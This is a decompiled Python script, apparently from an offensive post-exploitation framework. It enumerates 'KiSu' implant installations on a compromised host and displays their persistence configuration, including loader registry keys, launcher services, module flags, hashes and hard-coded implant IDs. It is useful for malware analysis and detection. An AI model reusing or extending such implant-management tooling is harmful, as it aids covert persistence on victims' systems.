# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_KiSuFullList_Tasking.py


def TaskingMain(namespace):
    import dsz
    import mcl
    import mcl.target
    import mcl.tasking
    dsz.control.echo.Off()
    lpParams = mcl.tasking.GetParameters()
    if lpParams['quiet']:
        dsz.control.quiet.On()
    dsz.ui.Echo('Listing current KISU installations')
    if not dsz.cmd.Run('kisu_list', dsz.RUN_FLAG_RECORD):
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        dsz.ui.Echo('* Unable to get list of KiSu installations', dsz.ERROR)
        return False
    dsz.ui.Echo('    SUCCESS', dsz.GOOD)
    kisu_list = list()
    try:
        for item in dsz.cmd.data.Get('Enumeration::Item', dsz.TYPE_OBJECT):
            try:
                id = dsz.cmd.data.ObjectGet(item, 'Id', dsz.TYPE_INT)[0]
                name = dsz.cmd.data.ObjectGet(item, 'Name', dsz.TYPE_STRING)[0]
                kisu_list.append((id, name))
            except:
                pass

    except:
        pass

    bRet = True
    for id, name in kisu_list:
        dsz.ui.Echo('Retrieving configuration for 0x%08x (%s)' % (id, name if name != '' else 'Unknown'))
        if dsz.cmd.Run('kisu_config -instance 0x%08x %s' % (id, '-checksum' if lpParams['checksum'] else ''), dsz.RUN_FLAG_RECORD):
            dsz.ui.Echo('    SUCCESS', dsz.GOOD)
            _displayConfiguration(id, name)
        else:
            dsz.ui.Echo('    FAILED', dsz.ERROR)
            bRet = False

    if bRet:
        mcl.tasking.TaskSetStatus(mcl.target.CALL_SUCCEEDED)
    return bRet


def _displayConfiguration(id, name):
    import dsz
    try:
        dsz.ui.Echo('KiSu Id:  0x%08x (%s)' % (id, name))
        version = dsz.cmd.data.Get('Configuration::Version', dsz.TYPE_STRING)[0]
        dsz.ui.Echo('Version:  %s' % version)
        key = dsz.cmd.data.Get('Configuration::kernelmoduleloader::registrykey', dsz.TYPE_STRING)[0]
        value = dsz.cmd.data.Get('Configuration::kernelmoduleloader::registryvalue', dsz.TYPE_STRING)[0]
        dsz.ui.Echo('Kernel Module Loader:')
        dsz.ui.Echo('    Registry Key:  %s' % key)
        dsz.ui.Echo('    Registry Value:  %s' % value)
        key = dsz.cmd.data.Get('Configuration::usermoduleloader::registrykey', dsz.TYPE_STRING)[0]
        value = dsz.cmd.data.Get('Configuration::usermoduleloader::registryvalue', dsz.TYPE_STRING)[0]
        dsz.ui.Echo('User Module Loader:')
        dsz.ui.Echo('    Registry Key:  %s' % key)
        dsz.ui.Echo('    Registry Value:  %s' % value)
        key = dsz.cmd.data.Get('Configuration::modulestoredirectory::registrykey', dsz.TYPE_STRING)[0]
        value = dsz.cmd.data.Get('Configuration::modulestoredirectory::registryvalue', dsz.TYPE_STRING)[0]
        dsz.ui.Echo('Module Store Directory:')
        dsz.ui.Echo('    Registry Key:  %s' % key)
        dsz.ui.Echo('    Registry Value:  %s' % value)
        key = dsz.cmd.data.Get('Configuration::launcher::serviceName', dsz.TYPE_STRING)[0]
        value = dsz.cmd.data.Get('Configuration::launcher::registryvalue', dsz.TYPE_STRING)[0]
        dsz.ui.Echo('Launcher:')
        dsz.ui.Echo('    Service Name:  %s' % key)
        dsz.ui.Echo('    Registry Value:  %s' % value)
        modules = dsz.cmd.data.Get('Configuration::module', dsz.TYPE_OBJECT)
        if len(modules) == 0:
            return True
        dsz.ui.Echo('')
        dsz.ui.Echo('Module Id         Size       Order      Flags    Name        Process')
        dsz.ui.Echo('=====================================================================')
        for mod in modules:
            flags = '%s%s%s%s%s%s%s%s%s%s%s' % (
             'B' if dsz.cmd.data.ObjectGet(mod, 'flags::boot_start', dsz.TYPE_BOOL)[0] else ' ',
             'S' if dsz.cmd.data.ObjectGet(mod, 'flags::system_start', dsz.TYPE_BOOL)[0] else ' ',
             'A' if dsz.cmd.data.ObjectGet(mod, 'flags::auto_start', dsz.TYPE_BOOL)[0] else ' ',
             'D' if dsz.cmd.data.ObjectGet(mod, 'flags::kernel_driver', dsz.TYPE_BOOL)[0] else ' ',
             'U' if dsz.cmd.data.ObjectGet(mod, 'flags::user_mode', dsz.TYPE_BOOL)[0] else ' ',
             'R' if dsz.cmd.data.ObjectGet(mod, 'flags::system_mode', dsz.TYPE_BOOL)[0] else ' ',
             'K' if dsz.cmd.data.ObjectGet(mod, 'flags::service_key', dsz.TYPE_BOOL)[0] else ' ',
             'E' if dsz.cmd.data.ObjectGet(mod, 'flags::encrypted', dsz.TYPE_BOOL)[0] else ' ',
             'C' if dsz.cmd.data.ObjectGet(mod, 'flags::compressed', dsz.TYPE_BOOL)[0] else ' ',
             'L' if dsz.cmd.data.ObjectGet(mod, 'flags::demand_load', dsz.TYPE_BOOL)[0] else ' ',
             'O' if dsz.cmd.data.ObjectGet(mod, 'flags::auto_start_once', dsz.TYPE_BOOL)[0] else ' ')
            name = dsz.cmd.data.ObjectGet(mod, 'moduleName', dsz.TYPE_STRING)[0]
            proc = dsz.cmd.data.ObjectGet(mod, 'processName', dsz.TYPE_STRING)[0]
            id = dsz.cmd.data.ObjectGet(mod, 'id', dsz.TYPE_INT)[0]
            dsz.ui.Echo('0x%08x  %10d  %10d  %s  %-10s  %-s' % (
             id,
             dsz.cmd.data.ObjectGet(mod, 'size', dsz.TYPE_INT)[0],
             dsz.cmd.data.ObjectGet(mod, 'order', dsz.TYPE_INT)[0],
             flags,
             _getName(name, id),
             proc))
            md5 = dsz.cmd.data.ObjectGet(mod, 'hash::md5', dsz.TYPE_STRING)[0]
            sha1 = dsz.cmd.data.ObjectGet(mod, 'hash::sha1', dsz.TYPE_STRING)[0]
            if len(md5) > 0:
                dsz.ui.Echo('    Md5  : %s' % md5)
            if len(sha1) > 0:
                dsz.ui.Echo('    Sha1 : %s' % sha1)

        dsz.ui.Echo('    B: BootStart,  S: SystemStart, A: AutoStart,      D: KernelDriver')
        dsz.ui.Echo('    U: UserMode,   R: SystemMode,  K: ServiceKey,     E: Encrypted')
        dsz.ui.Echo('    C: Compressed, L: DemandLoad,  O: AutoStart Once\t\t')
        dsz.ui.Echo('')
    except:
        pass


def _getName(str, id):
    if str != None and len(str.strip()) > 0:
        return str
    else:
        if id == 2873069695L:
            return 'UserModuleLoader 64-Bit'
        if id == 3141107506L:
            return 'UserModuleLoader 32-Bit'
        if id == 3141107508L:
            return 'Persistence Identifier'
        if id == 3141107507L:
            return 'BH'
        return '(No Name)'


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)